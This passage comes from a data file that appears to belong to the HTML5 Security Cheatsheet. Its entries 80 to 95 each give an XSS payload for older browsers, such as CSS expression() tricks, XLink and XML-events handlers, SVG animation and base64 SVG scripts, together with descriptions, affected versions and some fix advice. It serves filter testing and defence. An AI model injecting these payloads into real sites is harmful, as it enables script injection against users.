            'safari': ['3.0', '4.0', '5.0', '5.1.7'],
            'firefox': ['1.5', '2.0', '3.0', '4.0', '15.0'],        
            'opera': ['10.0', '11.0', '12.0', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'object', 'flash', 'swf', 'safari', 'firefox', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 80 - IE6 and halfwidth/fullwidth Unicode characters */
        'id'         : 80,
        'category'   : 'css', 
        'name'       : {
            'en' : 'IE6 and halfwidth/fullwidth Unicode characters',
            'ja' : '',
            'ru' : 'IE6 и юникодовые символы половинной и полной ширины',
            'cs' : 'IE6 a poloviční/plná šířka Unicode znaků',
            'de' : ''
        },
        'data'       : '<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(%js_write%)}</style>',
        'description': {
            'en' : 'This example shows how halfwidth/fullwidth Unicode characters can be used on IE6 to substitute characters from the ASCII range. Note that those characters have been used in the example to create the term "expression".',
            'ja' : '',
            'ru' : 'Пример демонстрирует возможность подмены ASCII символов юникодовыми символами половинной и полной ширины при формировании последовательности "expression" в Internet Explorer 6. Естественно, это не единственное место, где можно использовать такие символы.',
            'cs' : 'Tento příklad ukazuje, jak mohou být Unicode znaky poloviční a plné šíře použity k nahrazení znaků z ASCII rozsahu. V příkladu byly tyto znaku použity u výrazu "expression".',
            'de' : ''
        },
        'urls'    : ['http://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_Unicode_block'],
        'howtofix'   : {
            'en' : 'In case your website still has a lot of IE6 users make sure that the range of halfwidth and fullwidth form characters (U+FF00-FFEF) cannot be used in user submitted markup and styles.',
            'ja' : '',
            'ru' : 'В случае, если ваш сайт посещают счастливые обладатели IE6, убедитесь, что символы половинной и полной ширины (U+FF00-FFEF) не допускаются в пользовательской разметке и стилях.',
            'cs' : 'V případě, že návštěvníci vašich webových stránek stále používají IE6 ujistěte se, že rozsah Unicode znaků halfwidth a fullwidth (U + FF00-FFEF) nelze použít u tagů a stylů, které jsou vkládány uživatelem.',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'css', 'expression', 'unicode', 'halfwidth', 'fullwidth', 'internet explorer'],
        'reporter'   : '.mario'
    },
    { /* ID 81 - Active JavaScript execution via XLink */
        'id'         : 81,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Active JavaScript execution via XLink',
            'ja' : '',
            'ru' : 'Активный скриптинг с помощью XLink',
            'cs' : 'Spuštění JavaScriptu skrz XLink',
            'de' : ''
        },
        'data'       : '<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="%js_uri_alert%" xlink:type="simple"/>',
        'description': {
            'en' : 'FF supports the "xlink:actuate" attribute and allows displaying XML link without additional styles. The default namespace here is "html".',
            'ja' : '',
            'ru' : 'FF поддерживает атрибут xlink:actuate и может отобразить xml-ссылку без дополнительных стилей и пространства имен html.',
            'cs' : 'FF podporuje atribut "xlink:actuate" a povoluje zobrazení xlinků bez přidaných stylů. Defaultním jmenným prostorem je "html".',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xlink/#actuate-att', 'http://www.w3.org/TR/2010/REC-xlink11-20100506/', '#68', '#87'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.0', '3.6', '3.6.28', 'end']
        },
        'tags'       : ['xss', 'javascript', 'xlink', 'firefox', 'xml'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 82 - JavaScript execution via XML stylesheet, data URI and expression() */
        'id'         : 82,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'JavaScript execution via XML stylesheet, data URI and expression()',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью stylesheet, data URI и expression()',
            'cs' : 'Spuštění JavaScriptu skrz XML stylesheet, data URI a expression()',
            'de' : ''
        },
        'data'       : '<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(%js_write_2%);%7d"?>',
        'description': {
            'en' : 'Internet Explorer 8 and 9 support data URIs and thus are capable of including stylesheets this way. By using a xml stylesheet tag and a data URI containing an expression() it\'s possible to execute JavaScript without user interaction.',
            'ja' : '',
            'ru' : 'В примере еще раз показана возможность Internet Explorer 8 и 9 использовать data-схему для хранения небезопасной стилевой информации в XML.',
            'cs' : 'Internet Explorer 8 a 9 podporuje data URI a tak jsou schopny vložit touto cestou stylesheet. Použitím tagu xml-stylesheet a data URI obsahující expression() je možné spustit kód JavaScriptu bez uživatelské interakce.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xml-stylesheet/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'xml stylesheet', 'css', 'internet explorer', 'expression',  'xml'],
        'reporter'   : '.mario'
    },
    { /* ID 83 - Obfuscated WML injection via undeclared WAP-ML Variables */
        'id'         : 83,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Obfuscated WML injection via undeclared WAP-ML Variables',
            'ja' : '',
            'ru' : 'Обфускация опасного параметра с использованием wml-переменных',
            'cs' : 'Zamaskování nebezpečných parametrů proměnnými wml',
            'de' : ''
        },
        'data'       : '<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:%js_alert%"><x:timer value="1"/></x:template>',
        'description': {
            'en' : 'The example demonstrates the use in WML undeclared variables (are ignored). These variables can be declared in the tags <setvar>, <input>, <select>. Namespace indicated for use inside the XML-file. Also inside WML-files can you use a lot of regular HTML-tags.', 
            'ja' : '',
            'ru' : 'Пример демонстрирует использование в WML необъявленных переменных, которые будут игнорироваться. Эти переменные можно объявить в тегах <setvar>, <input>, <select>. Пространство имен указано для использования в XML-файле. Не забывайте, что внутри WML-файлов вы можете использовать множество обычных HTML-тегов. ',
            'cs' : 'Příklad demonstruje použití nedeklarované WML proměnných (jsou ignorovány). Tyto rpoměnné mohou být deklarovány tagy <setvar>, <input> a <select>. Jmenný prostor náleží použití v souboru XML. V souborech WML můžete také používat množství HTML tagů.',
            'de' : ''
        },
        'urls'    : ['http://www.w3schools.com/wap/wml_variables.asp','#69'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['9.x', '10.0', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'wml', 'opera', 'mobile', 'timer', 'variable'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 84 - Opera JavaScript execution via XML-events handler */
        'id'         : 84,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Opera JavaScript execution via XML-events handler',
            'ja' : '',
            'ru' : 'Выполнение javascript в Opera c помощью обработчика XML-события',
            'cs' : 'Spuštění JavaScriptu skrz XML zachytávání událostí v Opeře',
            'de' : ''
        },
        'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="%js_uri_alert%//#x"/>',
        'description': {
            'en' : 'The browser tries to load an external XML-event handler and execute JavaScript without user interaction. The problem seems to be fixed in Opera 11.', 
            'ja' : '',
            'ru' : 'Браузер пытается загрузить внешний обработчик XML-события и выполняет javascript.',
            'cs' : 'Webový prohlížeč používá externí XML-event handler pro událost "load" pro spuštění JavaScriptu bez uživatelské interakce.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xml-events/', '#85'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['9.x', '10.0', '11.0', '11.01', 'end', 'mobile', 'end']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'event', 'handler'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 85 - Arbitrary payload injection in Opera via XML-events handler */
        'id'         : 85,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Arbitrary payload injection in Opera via XML-events handler',
            'ja' : '',
            'ru' : 'Инъекция удаленного javascript-кода в Opera c помощью обработчика XML-события',
            'cs' : 'Libovolná injekce kódu přes XML události v Opeře',
            'de' : ''
        },
        'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '1',            
            'path'          : 'http://html5sec.org/test.evt',
            'name'          : 'test.evt',
            'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml" id="x">%js_alert%</script>'
        },
        'description': {
            'en' : 'The browser loads an external xml-event handler, which contains the JavaScript code. This example also works with data URIs.', 
            'ja' : '',
            'ru' : 'Браузер загружает внешний обработчик XML-события, который содержит javascript код. Этот пример также будет работать с data-схемой.',
            'cs' : 'Browser načítá externí xml-event handler, který obsahuje kód JavaScriptu. Tento příklad pracuje také s data URI.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/xml-events/', '#94', '#104', '#127'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['9.x', '10.0', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'event', 'handler', 'arbitrary'],
        'reporter'   : 'LeverOne'
    },    
    { /* ID 86 - Passive JavaScript execution via <BODY> and oninput attribute */
        'id'         : 86,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Passive JavaScript execution via <BODY> and oninput attribute',
            'ja' : '',
            'ru' : 'Пассивный скриптинг с помощью <BODY> и атрибута oninput',
            'cs' : 'Pasivní JavaScript spuštěný skrz <BODY> a atribut oninput',
            'de' : ''
        },
        'data'       : '<body oninput=%js_alert%><input autofocus>',
        'description': {
            'en' : 'All browsers besides Internet Explorer 9↓ support the "oninput" event handler around form elements like the given <INPUT>. The event works for the form elements itself, the surrounding form and <BODY> as well as <HTML> tags.', 
            'ja' : '',
            'ru' : 'Все браузеры за исключением Internet Explorer 9↓ поддерживают обработчик oninput, который может быть внедрен в любой тег, обрамляющий любую область пользовательского ввода (не только в тегах форм, но и в тегах с атрибутом contenteditable).',
            'cs' : 'Všechny prohlížeče kromě Internet Exploreru 9↓ podporují zpracování událostí "oninput" u formulářových prvků, jako například uvedený <input>. Událost pracuje se samotnými prvky formuláře, mimo formulář, ale také v tagu <BODY> nebo <HTML>',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Do not whitelist "oninput" attributes in user submitted markup.',
            'ja' : '',
            'ru' : 'Убедитесь, что правила вашего фильтра учитывают появление в HTML5 новых обработчиков событий.',
            'cs' : 'Zajistěte aby atribut "oninput" nebyl uveden ve whitelistu pro uživatelské vstupy.',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox' : ['3.6', '4.0', '15.0'], 
            'safari' : ['4.0', '5.0', '5.1.7'], 
            'chrome' : ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'opera': ['9.0', '10.0', '11.0', '12.0', 'mobile'],
            'internet explorer': ['10.0']
        },
        'tags'       : ['xss', 'javascript', 'html5', 'oninput', 'form', 'passive', 'event'],
        'reporter'   : 'Skyphire'
    },
    { /* ID 87 - SVG simple passive JavaScript execution via XLink */
        'id'         : 87,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG simple passive JavaScript execution via XLink',
            'ja' : '',
            'ru' : 'Пассивный скриптинг в SVG c помощью XLink',
            'cs' : 'Spuštění jednoduchého pasivního JavaScriptu skrz XLink ',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="%js_uri_alert%"><rect width="1000" height="1000" fill="white"/></a>\n</svg>',        
        'description': {
            'en' : 'Browsers that support SVG, forced to support XLink. The parameter of the attribute "xlink:actuate" for <a> tag is fixed - "onRequest".',
            'ja' : '',
            'ru' : 'Браузеры, которые поддерживают SVG, вынуждены поддерживать и XLink, поскольку таким образом реализуются почти все связи. Параметр атрибута xlink:actuate тега <a> является фиксированным - onRequest.',
            'cs' : 'Prohlížeče, které podporují SVG, vynucují podporu XLink. Parametr atributu "xlink:actuate" u tagu <A> je pevný "onRequest".',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG11/linking.html', 'http://www.w3.org/TR/SVGTiny12/linking.html', '#68', '#81', '#130'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        }, 
        'browsers'   : {
           'chrome' : ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
           'safari' : ['3.4', '4.0', '5.0', '5.1.7'],
           'firefox': ['3.0', '4.0', '15.0'],
           'opera'  : ['9.x', '10.0', '11.0', '12.0'],
           'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'svg', 'passive', 'xlink', 'chrome', 'firefox', 'safari', 'opera'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 88 - SVG active JavaScript execution via XLink in Opera */
        'id'         : 88,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG active JavaScript execution via XLink in Opera',
            'ja' : '',
            'ru' : 'Активный скриптинг в SVG с помощью XLink для Opera',
            'cs' : 'SVG spuštění aktivního JavaScriptu skrz XLink v Opeře',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<animation xlink:href="%js_uri_alert%"/>\n<animation xlink:href="data:text/xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n\n<image xlink:href="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n\n<foreignObject xlink:href="%js_uri_alert%"/>\n<foreignObject xlink:href="data:text/xml,%3Cscript xmlns=\'http://www.w3.org/1999/xhtml\'%3E%js_alert%%3C/script%3E"/>\n\n</svg>',        
        'description': {
            'en' : 'The content of the xml-links will be automatically included in the current document. The combination of "onLoad" (value of xlink:actuate) and "embed" (value of xlink:show) forms of potentially unsafe SVG-elements.',
            'ja' : '',
            'ru' : 'Содержимое xml-ссылки автоматически включается в текущий документ. Сочетание предустановленных параметров onLoad атрибута xlink:actuate и embed атрибута xlink:show образует потенциально небезопасные SVG-элементы.',
            'cs' : 'Obsah XML-odkazů bude automaticky vložen do aktuálního dokumentu. Kombinace "onLoad" (hodnota atributu xlink:actuate) a "embed" (hodnota atributu xlink:show) s potenciálně nebezpečnými SVG prvky.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG11/attindex.html', 'http://www.w3.org/TR/SVGTiny12/attributeTable.html','#95','#129'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
	       'opera'  : ['9.x', '10.0', '11.0', '12.0']
        },
        'tags'       : ['xss', 'svg', 'active', 'xlink', 'opera'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 89 - SVG event handler injection via "set" and "animate" */
        'id'         : 89,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG event handler injection via "set" and "animate"',
            'ja' : '',
            'ru' : 'Инъекция обработчика события в SVG с помощью анимирования',
            'cs' : 'SVG zpracování události - vložení kódu skrz "set" a "animate"',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="%js_alert%"/>\n<animate attributeName="onunload" to="%js_alert%"/>\n</svg>',        
        'description': {
            'en' : 'Google Chrome and Safari support binding an event handler using the elements <set> or <animate>. The attribute value is the actually bound event while the "to" attribute value holds the payload. The problem has been fixed in recent Chrome versions.',
            'ja' : '',
            'ru' : 'Google Chrome и Safari поддерживают привязку обработчика события с использованием элементов <set> или <animate>.',
            'cs' : 'Google Chrome a Safari podporují zpracování událostí u prvků <set> nebo <animate>. Hodnota atributu "attributeName" určuje spouštěcí událost, zatímco atribut "to" obsahuje samotný kód JavaScriptu.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG11/animate.html', 'http://www.w3.org/TR/SVGMobile12/animate.html', '#24', '#28'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome' : ['4.0', '5.0', '6.0', '10.0', 'end'],
            'safari' : ['3.4', '4.0', '4.0.3', 'end'],
        },
        'tags'       : ['xss', 'svg', 'event', 'safari', 'chrome'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 90 - SVG images containing XML data - with disabled JavaScript */
        'id'         : 90,
        'category'   : 'css', 
        'name'       : {
            'en' : 'SVG images containing XML data - with disabled JavaScript',
            'ja' : '',
            'ru' : 'SVG-изображение как XML-документ с выключенным javascript',
            'cs' : 'SVG obrázky obsahující XML data - s vypnutým JavaScriptem',
            'de' : ''
        },
        'data'       : '<!-- Up to Opera 10.63 -->\r\n<div style=content:url(%svg_path_2%)></div>\r\n\r\n<!-- Up to Opera 11.64 - see link below -->\r\n\r\n<!-- Up to Opera 12.x -->\r\n<div style="background:url(%svg_path_3%)">PRESS ENTER</div>',
        'attachment' : {
            'required_mime' : 'image/svg+xml',
            'crossdomain'    : '0',            
            'path'          : 'http://html5sec.org/test5.svg',
            'name'          : 'test5.svg',
            'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="%js_uri_alert%">\r\n<!--  this file can be crossdomain if "action" attribute refers to an external file -->\r\n<meta http-equiv="refresh" content="1;URL=%svg_path_3%"/>\r\n<input type="submit" autofocus="autofocus"/>\r\n</form>'
        },
        'description': {
            'en' : 'Opera supports the CSS property "content" for style attributes. The SVG image can contain SVG as well as HTML code. The example for Opera 10.x shows how a <FORM> tag can be used to trick the user into clicking a button and thus executing JavaScript. Example for Opera 12.x shows one of the problems (along with a client side DoS, running the "onblur" event, etc), which is generated because of the possibility to steal a focus via embeded SVG image.  The same works of course for SVG files embedded via <IMG> tags.',
            'ja' : '',
            'ru' : 'Opera поддерживает CSS-свойство content в стилевом атрибуте. В качестве его значения может быть указан объект, который заместит html-тег. Пример для Opera 12 показывает одну из проблем (наряду с DoS\'ом с клиентской стороны, запуском события onblur и т.д.), которую порождает возможность похитить фокус пользователя с помощью внедренного SVG-изображения. Такой же эффект (а именно вставка ифрейма на страницу) происходит при вставке SVG-изображения через тег <IMG>.',
            'cs' : 'Opera podporuje CSS vlastnost "content" pro atributy stylu. Obrázek ve formátu SVG může obsahovat SVG stejně dobře jako HTML kód. Příklad ukazuje jak může být tag <FORM> použit pro nalákání uživatele ke kliknutí na tlačítko a tím k provedení JavaScriptu. Stejné pracuje také pro SVG soubory vložené pomocí tagu <IMG>.',
            'de' : ''
        },
        'urls'    : ['http://heideri.ch/opera/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
	       'opera'  : ['10.x', '11.0', '12.0']
        },
        'tags'       : ['xss', 'svg', 'css', 'opera', 'content', 'form'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 91 - Special tags parsing issues */
        'id'         : 91,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Special tags parsing issues',
            'ja' : '',
            'ru' : 'Особенности разбора спецтегов',
            'cs' : 'Problémy při parsování speciálních tagů',
            'de' : ''
        },
        'data'       : '[A]\n<? foo="><script>%js_alert%</script>">\n<! foo="><script>%js_alert%</script>">\n</ foo="><script>%js_alert%</script>">\n[B]\n<? foo="><x foo=\'?><script>%js_alert%</script>\'>">\n[C]\n<! foo="[[[x]]"><x foo="]foo><script>%js_alert%</script>">\n[D]\n<% foo><x foo="%><script>%js_alert%</script>">',        
        'description': {
            'en' : 'The HTML tagnames start with a-zA-Z (abstracting from ignoring null byte from IE). In addition, there are other structures, parsed as a tag (special tags). They begin with the following characters: !,?, /,%. This has its reasons:  DTD, comments, xml-declaration, import-instruction in Internet Explorer, closing tags etc. starts by these characters. These examples show that such tags will inherit some properties of their standard models.\n\n[A] Firefox, Opera, Google Chrome, Safari (4.0.4↑), IE 10↑ Standards mode: Parameters of the special tags can not contain a closing parenthesis ">".\n\n[B] Safari (up to 4.0.3): Parameter of the special tags can be broken only via "?>".\n\n[C] Opera (up to 11.52): Special tag inherits the properties of DTD: inside it you can create a section that starts with "[" and ends with "]".\n\n[D] IE 9↓ Standards mode, Safari (up to 4.0.3): A sequence like "<% ... %>" is an alternative to comments.\n\nThese features can be used for obfuscation and bypassing filters. And remember, do not parse as a tag in HTML structure like "<È foo=...>".',
            'ja' : '',
            'ru' : 'В HTML имена тегов начинаются с a-zA-Z (если при этом абстрагироваться от игнорирования нулевого символа со стороны IE). Помимо этого существуют другие конструкции, распознающиеся в качестве тегов (спецтеги). Они начинаются со следующих символов : !, ?, /, % . Этому есть очевидные причины : с этих символов начинаются DTD, комментарии, xml-декларации, инструкции импорта в Internet Explorer, закрывающие теги и т.д. В приведенных ниже примерах мы видим, что спецтеги, несмотря на явные синтаксические отличия от своих стандартных моделей, сохраняют некоторые их свойства.\n\n[A] Firefox, Opera, Google Chrome, Safari (4.0.4↑), режим стандартов IE 10↑: Параметр специального тега не может содержать закрывающую скобку (>).\n\n[B] Safari (вплоть до 4.0.3): Параметр может быть прерван только последовательностью ?> .\n\n[C] Opera (вплоть до 11.52): Спецтег унаследовал свойсвтво DTD: внутри него можно открыть особую секцию, начинающуюся с [ и оканчивающуюся на ].\n\n[D] режим стандартов IE 9↓, Safari (вплоть до 4.0.3): Последовательность <% ... %> может быть использована в качестве альтернативы комментариям.\n\nЭти особенности могут быть использованы для обфускации и обхода фильтров. И помните: не следует воспринимать в качестве тегов конструкции, ими в HTML не являющиеся (наподобие <È foo=...>).',
            'cs' : 'HTML tagy začínají znaky a-z A-Z. Kromě toho existují ještě jiné struktury, které jsou také parsovány jako tagy (speciální tagy). Ty začínají některým ze znaků !, ?, /, %. Jejich použití je u: DTD, komentářů, xml-deklarací, instrukcí importu v Internet Exploreru, u uzavíracích tagů, apd. Tyto příklady ukazují, že tyto tagy zdědí některé vlastnosti jejich standardních modelů.\n\n[A] Firefox, Opera, Google Chrome, Safari (4.0.4↑), IE 10↑ Standards mode: Parametry speciálních tagů nemohou obsahovat uzavírací lomenou závorku ">".\n\n[B] Safari (až do 4.0.3): Parametry speciálních znaků mohou být rozbity jen s "?>".\n\n[C] Opera (až do 11.52): Speciální tag dědí vlastnosti DTD: uvnitř může vytvořit oddíl, který začíná znakem "[" a končí znakem "]".\n\n[D] IE 9↓ Standards mode, Safari (až do 4.0.3): Sekvence znaků jako "<% ... %>" je alternativa komentářů.\n\nTěchto zápisů se používá k oklamání a obcházení bezpečnostních filterů. Pamatujte si, že tyto zápisy nejsou v HTML parsovány jako tag se strukturou jako "<È foo=...>".',
            'de' : ''
        },
        'urls'    : ['http://sla.ckers.org/forum/read.php?2,15812,28148#msg-28148', '#134'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
            'opera': ['8.x', '9.0', '10.0', '11.0', '12.0', 'mobile'], 
            'firefox' : ['1.x', '2.0', '3.0', '4.0', '15.0'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['3.0', '4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'tagname', 'internet explorer', 'opera', 'firefox', 'chrome', 'safari', 'parsing', 'breaking', 'obfuscation', 'closing tag'],
        'reporter'   : 'LeverOne, wpulog'
    },
    { /* ID 92 - Breaking the functional notation on IE (1) */
        'id'         : 92,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Breaking the functional notation on IE (1)',
            'ja' : '',
            'ru' : 'Способ разорвать функциональную нотацию в IE (1)',
            'cs' : 'Přerušení funkčního zápisu v IE (1)',
            'de' : ''
        },
        'data'       : '<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>',       
        'trigger'    : 'document.getElementsByTagName("div")[0].style=="red"?pass():fail()',
        'description': {
            'en' : 'To break the functional notation on IE "url()" can be used combined with a following whitespace - then followed by any non-whitespace character.\n\nThe following characters* are whitespaces:\n\n IE 6,7 standards mode: 9-13,32,160,8192-8203,12288,65279\nIE 8 standards mode: 1-32,127\n\n* These are given in decimal codes.',
            'ja' : '',
            'ru' : 'В качестве прерывателя функциональной нотации "url()" может быть использована комбинация из любого пробельного символа, за которым следует любой непробельный символ.\n\nВ качестве пробельных здесь понимаются следующие символы*:\n\n Режим стандартов IE 6,7: 9-13,32,160,8192-8203,12288,65279\nРежим стандартов IE 8: 1-32,127\n\n* В десятичных кодах.',
            'cs' : 'Přerušení funkčního zápisu "url()" v IE může být vyvoláno kombinací bílého znaku, který je následován nebílým znakem.\n\nNásledující znaky* jsou bílými znaky:\n\nIE 6,7 standards mode: 9-13,32,160,8192-8203,12288,65279\nIE 8 standards mode: 1-32,127\n\n* Kódy znaků jsou uvedeny v desítkové soustavě.',
            'de' : ''
        },
        'urls'    : ['#111', '#112' , '#114'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'css', 'internet explorer', 'trick', 'notation'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 93 - Multiple CSS "url()" values in IE 6 */
        'id'         : 93,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Multiple CSS "url()" values in IE 6',
            'ja' : '',
            'ru' : 'Множественный "url()" в IE 6',
            'cs' : 'Více CSS "url" hodnot v IE 6',
            'de' : ''
        },
        'data'       : '<div style="list-style:url(http://foo.f)\\20url(%js_uri_alert%);">X</div>',        
        'description': {
            'en' : 'Internet Explorer supports multiple "url()" values all of which can contain payload. The delimiter between the "url()" values should be a whitespace character ("\\x20" in the given example).',
            'ja' : '',
            'ru' : 'IE поддерживает множественный "url()", который может содержать "полезную нагрузку". Разделителем "url()" должен быть любой пробельный символ (\\x20 в приведенном примере).',
            'cs' : 'Internet Explorer podporuje více "url()" hodnot. Z nichž každá může obsahovat útocný kód. Oddělovač mezi hodnotami "url()" by měl být bílý znak (v tomto případě "\\x20").',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure in case the user is allowed to submit CSS it is being filtered and whitelisted correctly to avoid attacks via multiple backgrounds.',
            'ja' : '',
            'ru' : 'В случае предоставления пользователю возможности добавлять стили, убедитесь, что правила белого списка сформированы корректно, чтобы избежать аттак через множественный "url()".',
            'cs' : 'Ujistěte se, že uživatel nemá povoleno vložení CSS, maximálně ty vlastnosti, které jsou uvedeny ve whitelistu.',
            'de' : ''
        },
        'browsers'   : {
            'internet explorer': ['6.0' , 'end']
        },
        'tags'       : ['xss', 'css', 'internet explorer', 'trick', 'url'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 94 - Using SVG element <handler> */
        'id'         : 94,
        'category'   : 'svg',
        'name'       : {
            'en' : 'Using SVG element <handler>',
            'ja' : '',
            'ru' : 'Использование SVG-элемента <handler>',
            'cs' : 'Použití SVG elementu <handler>',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">%js_alert%</handler>\n</svg>',        
        'description': {
            'en' : 'Specification SVG Tiny 1.2 provides an element <handler>, which is a "bridge" between SVG and XML-events. This element can contain regular JavaScript.',
            'ja' : '',
            'ru' : 'Спецификацией SVG Tiny 1.2 предусмотрен элемент <handler>, который является связующим звеном между SVG и XML-events. Этот элемент может заключать в себе обычный JavaScript код.',
            'cs' : 'Specifikace SVG Tiny 1.2 poskytuje prvek <handler>, který je "mostem" mezi SVG a XML událostmi. Tento element může obsahovat kód JavaScriptu.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVGMobile12/script.html#HandlerElement', 'http://www.w3.org/TR/xml-events/', '#85', '#104', '#127'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },
        'browsers'   : {
            'opera'  : ['10.0', '11.0', '12.0', 'mobile']
        },
        'tags'       : ['xss', 'svg', 'opera', 'XML-events'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 95 - Using SVG element <feImage> and animated data URIs */
        'id'         : 95,
        'category'   : 'svg',
        'name'       : {
            'en' : 'Using SVG element <feImage> and animated data URIs',
            'ja' : '',
            'ru' : 'Использование SVG-элемента <feImage> и анимируемого data URIs',
            'cs' : 'Použití SVG elementu <feImage> a data URI',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<feImage>\n<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>\n</feImage>\n</svg>',        
        'description': {
